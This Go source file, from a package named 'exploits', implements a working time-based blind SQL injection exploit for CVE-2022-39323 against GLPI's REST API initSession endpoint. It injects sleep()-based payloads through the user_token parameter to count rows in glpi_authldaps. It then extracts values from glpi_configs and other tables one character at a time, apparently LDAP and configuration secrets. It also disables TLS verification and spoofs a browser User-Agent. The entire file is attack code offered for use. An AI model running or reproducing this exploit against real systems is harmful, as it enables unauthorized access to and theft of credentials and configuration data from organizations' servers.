package exploits

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"strconv"
	"time"
)

func CVE202239323Getcol(target string, sleept int) string {

	var col_nbr string

	if CheckCVE202239323(target) {
		for _, nbr := range Dic_nbr {
			Payload := url.QueryEscape("'OR (SELECT * FROM (SELECT IF ((SELECT count(*) FROM glpi_authldaps)=" + string(nbr) + ",sleep(" + strconv.Itoa(sleept) + "),0))a) AND 'd26' = 'd26")
			client := &http.Client{
				Transport: &http.Transport{
					TLSClientConfig: &tls.Config{
						InsecureSkipVerify: true,
					},
				},
				Timeout: (time.Duration(sleept) + 3) * time.Second,
			}

			start := time.Now()
			req, err := client.Get(target + "/apirest.php/initSession?user_token=" + Payload)
			if err != nil {
				fmt.Println(err)
			}
			req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
			defer req.Body.Close()

			elapsed := time.Since(start)

			if elapsed.Seconds() > float64(sleept) {
				fmt.Println(string(nbr) + " Column in glpi_authldaps table !")
				col_nbr = string(nbr)

			}
		}
	}
	return col_nbr
}

func CVE202239323(target string, sleept int) {

	var colmaxid = CVE202239323Getcol(target, sleept)

	fmt.Printf("Select the line to extract 1 to %s : ", colmaxid)

	var col_nbr string
	_, err := fmt.Scanf("%s", &col_nbr)
	if err != nil {
		fmt.Println("Error in reading user input, retrieval of column 1")
		col_nbr = "1"
	}

	var Payload string

	for _, tableinf := range TableP {

		for _, colname := range tableinf.COLNAME {

			fmt.Print("\nRetrieving " + colname + " : ")

			for i := 1; i < 666; i++ {
				var notfound = true

				for _, chars := range Dic {
					if tableinf.TABLENAME == "glpi_configs" {
						Payload = url.QueryEscape("'OR (SELECT * FROM (SELECT IF ((SELECT ASCII(SUBSTRING(value," + strconv.Itoa(i) + ",1)) FROM " + tableinf.TABLENAME + " WHERE name= \"" + colname + "\")=" + strconv.Itoa(int(string(chars)[0])) + ",sleep(" + strconv.Itoa(sleept) + "),0))a) AND 'd26' = 'd26")

					} else {
						Payload = url.QueryEscape("'OR (SELECT * FROM (SELECT IF ((SELECT ASCII(SUBSTRING(" + colname + "," + strconv.Itoa(i) + ",1)) FROM " + tableinf.TABLENAME + " WHERE id= " + col_nbr + " )=" + strconv.Itoa(int(string(chars)[0])) + ",sleep(" + strconv.Itoa(sleept) + "),0))a) AND 'd26' = 'd26")

					}

					client := &http.Client{
						Transport: &http.Transport{
							TLSClientConfig: &tls.Config{
								InsecureSkipVerify: true,
							},
						},
						Timeout: (time.Duration(sleept) + 3) * time.Second,
					}

					start := time.Now()
					req, err := client.Get(target + "/apirest.php/initSession?user_token=" + Payload)
					if err != nil {
						fmt.Println(err)
					}
					req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
					defer req.Body.Close()

					elapsed := time.Since(start)

					if elapsed.Seconds() > float64(sleept) {
						fmt.Print(string(chars))
						notfound = false
						break

					}

				}
				if notfound {
					break
				}

			}

		}

	}
}
